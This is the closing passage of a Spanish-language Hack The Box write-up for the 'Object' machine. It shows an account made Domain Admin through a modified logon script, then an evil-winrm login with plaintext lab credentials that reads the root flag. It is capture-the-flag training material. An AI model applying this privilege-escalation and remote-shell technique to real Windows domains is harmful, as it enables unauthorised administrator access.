+Password expires             Never
+Password changeable          10/22/2021 9:16:32 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 C:\ProgramData\Privesc\test.ps1
+User profile
+Home directory
+Last logon                   10/26/2023 2:25:15 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Admins        *Domain Users
+The command completed successfully.
+</code></pre>
+
+<p>Ahora tendriamos que volver a conectarnos para actualizar los permisos, dirigirnos al directorio personal del usuario <code>Administrator</code> y visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; cd C:\Users\Administrator\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+923cbfd8245771bc2a485f96fb451072
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Object - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Object" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
